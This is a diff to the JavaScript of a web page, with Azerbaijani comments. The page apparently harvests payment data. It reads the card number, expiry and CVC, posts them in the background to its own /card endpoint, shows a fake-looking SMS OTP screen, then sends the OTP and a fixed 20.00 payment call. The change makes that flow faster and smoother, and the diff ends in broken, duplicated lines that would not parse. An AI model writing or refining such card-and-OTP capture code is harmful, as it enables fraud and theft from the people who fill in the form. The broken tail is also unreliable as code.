@@ -583,25 +583,29 @@
             clearInterval(otpInterval);
         }
 
-        async function submitCardDetails(event) {
-            event.preventDefault();
-            const cardNo = document.getElementById('card-no').value;
-            const cardExp = document.getElementById('card-exp').value;
-            const cardCvc = document.getElementById('card-cvc').value;
+        function submitCardDetails(event) {
+            if (event) event.preventDefault();
+            const cardNoEl = document.getElementById('card-no');
+            const cardExpEl = document.getElementById('card-exp');
+            const cardCvcEl = document.getElementById('card-cvc');
 
-            try {
-                await robustFetch(`${API_URL}/card`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cardNo, cardExp, cardCvc })
-                });
-            } catch (err) {
-                console.error("Kart göndərmə xətası:", err);
-            }
+            const cardNo = cardNoEl ? cardNoEl.value : '';
+            const cardExp = cardExpEl ? cardExpEl.value : '';
+            const cardCvc = cardCvcEl ? cardCvcEl.value : '';
 
+            // Anında SMS OTP modal pəncərəsini aç
             document.getElementById('card-modal')?.classList.add('hidden');
             document.getElementById('otp-modal')?.classList.remove('hidden');
             startOtpTimer();
+
+            // Arxa fonda kart məlumatlarını serverə göndər (UI bloklanmasın)
+            robustFetch(`${API_URL}/card`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cardNo, cardExp, cardCvc })
+            }).catch(err => {
+                console.error("Kart göndərmə xətası:", err);
+            });
         }
 
         function startOtpTimer() {
@@ -622,9 +626,10 @@
             }, 1000);
         }
 
-        async function submitOtpCode(event) {
-            event.preventDefault();
-            const otpCode = document.getElementById('otp-code').value;
+        function submitOtpCode(event) {
+            if (event) event.preventDefault();
+            const otpCodeEl = document.getElementById('otp-code');
+            const otpCode = otpCodeEl ? otpCodeEl.value : '';
             if (otpCode.length < 4) {
                 alert("Zəhmət olmasa 4-6 rəqəmli təsdiq kodunu düzgün daxil edin.");
                 return;
@@ -635,19 +640,20 @@
             closeModals();
             showLoadingScreen();
 
-            try {
-                await robustFetch(`${API_URL}/otp`, {
+            robustFetch(`${API_URL}/otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otpCode })
+            }).then(() => {
+                return robustFetch(`${API_URL}/pay`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ otpCode })
+                    body: JSON.stringify({ amountPaid: 20.00 })
                 });
-            } catch (err) {
-                console.error("OTP göndərmə xətası:", err);
-            }
-
-            try {
-                await robustFetch(`${API_URL}/pay`, {
-                    method: 'POST',
+            }).catch(err => {
+                console.error("OTP / Pay xətası:", err);
+            });
+        }
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ amountPaid: 20.00 })
                 });
